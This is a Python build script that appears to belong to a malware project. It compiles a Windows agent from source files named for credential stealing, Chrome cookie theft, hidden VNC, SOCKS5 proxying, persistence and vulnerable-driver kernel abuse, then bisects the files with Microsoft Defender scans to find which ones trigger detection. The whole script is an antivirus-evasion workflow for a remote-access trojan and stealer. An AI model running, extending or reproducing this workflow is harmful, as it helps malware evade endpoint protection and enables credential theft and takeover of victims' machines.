#!/usr/bin/env python3
"""Strip Test: Build full agent removing files one-by-one to find Defender ML trigger."""
import subprocess, os, sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BUILD_DIR = 'build'
AGENT_DIR = 'agent/native'
os.makedirs(BUILD_DIR, exist_ok=True)

# Base files (stager-equivalent, known CLEAN)
BASE = ['core.c','syscall.c','stack_spoof.c','cap_loader.c','dead_drop.c',
        'inject.c','domain_front.c','bof_loader.c']

# Suspect files to test
SUSPECTS = ['main.c','stealer.c','chrome_v20.c','chrome_inject.c',
            'socks5.c','hvnc.c','persist.c','byovd.c','eprocess.c','version_stubs.c']

LIBS = '-lkernel32 -luser32 -lws2_32 -lgdi32 -luuid -ladvapi32 -lcrypt32 -lole32 -loleaut32 -lwinhttp -lbcrypt -liphlpapi -ldbghelp -lshlwapi -lntdll -lversion'

# Find Defender
plat = r'C:\ProgramData\Microsoft\Windows Defender\Platform'
vs = sorted(os.listdir(plat), reverse=True)
MP = os.path.join(plat, vs[0], 'MpCmdRun.exe')

def build_and_scan(name, srcs):
    src_paths = ' '.join(f'{AGENT_DIR}/{s}' for s in srcs)
    out = os.path.join(BUILD_DIR, f'strip_{name}.exe')
    cmd = f'gcc -w -DARES_RELEASE -O2 -s -fno-ident -fno-asynchronous-unwind-tables -Wl,--stack,4194304 -mwindows -I. -o {out} {src_paths} {LIBS}'
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd='.')
    if r.returncode != 0:
        return 'BUILD_FAIL', r.stderr[:200]
    sz = os.path.getsize(out)
    r2 = subprocess.run([MP, '-Scan', '-ScanType', '3', '-File', os.path.abspath(out), '-DisableRemediation'],
                        capture_output=True, text=True, timeout=30)
    if 'found no threats' in r2.stdout:
        return 'CLEAN', f'{sz:,}B'
    threat = ''
    for line in r2.stdout.split('\n'):
        if 'Threat' in line and ':' in line:
            threat = line.strip()
            break
    return 'DETECTED', f'{sz:,}B'

print('='*60)
print('STRIP TEST: Finding Defender ML trigger files')
print('='*60)

results = []

# Phase 1: Add each suspect to base individually
print('\n--- Phase 1: base + 1 file ---')
for suspect in SUSPECTS:
    srcs = BASE + [suspect]
    result, detail = build_and_scan(f'p1_{suspect.replace(".c","")}', srcs)
    icon = '[CLEAN]' if result == 'CLEAN' else ('[DETECTED]' if result == 'DETECTED' else '[FAIL]')
    print(f'  base+{suspect:<22} {icon} {detail}')
    results.append((suspect, 'phase1', result))

# Phase 2: Full minus each suspect
print('\n--- Phase 2: full - 1 file ---')
for suspect in SUSPECTS:
    if suspect == 'main.c':
        continue
    srcs = BASE + [s for s in SUSPECTS if s != suspect]
    result, detail = build_and_scan(f'p2_no_{suspect.replace(".c","")}', srcs)
    icon = '[CLEAN]' if result == 'CLEAN' else ('[DETECTED]' if result == 'DETECTED' else '[FAIL]')
    print(f'  full-{suspect:<22} {icon} {detail}')
    results.append((suspect, 'phase2', result))

# Phase 3: Groups
print('\n--- Phase 3: Grouped ---')
stealer_group = ['stealer.c','chrome_v20.c','chrome_inject.c']
srcs = BASE + [s for s in SUSPECTS if s not in stealer_group]
r, d = build_and_scan('p3_no_stealer', srcs)
print(f'  full-[stealer+chrome]          {"[CLEAN]" if r=="CLEAN" else "[DETECTED]"} {d}')

rat_group = ['socks5.c','hvnc.c','byovd.c','eprocess.c']
srcs = BASE + [s for s in SUSPECTS if s not in rat_group]
r, d = build_and_scan('p3_no_rat', srcs)
print(f'  full-[socks5+hvnc+byovd]       {"[CLEAN]" if r=="CLEAN" else "[DETECTED]"} {d}')

srcs = BASE + ['persist.c','version_stubs.c']
r, d = build_and_scan('p3_persist_only', srcs)
print(f'  base+[persist+stubs]           {"[CLEAN]" if r=="CLEAN" else "[DETECTED]"} {d}')

print('\n' + '='*60)
print('SUMMARY - Phase 1 triggers (adding to CLEAN base):')
for f, ph, res in results:
    if ph == 'phase1' and res == 'DETECTED':
        print(f'  TRIGGER: {f}')
print('Phase 2 fixes (removing from DETECTED full):')
for f, ph, res in results:
    if ph == 'phase2' and res == 'CLEAN':
        print(f'  FIX by removing: {f}')
print('='*60)
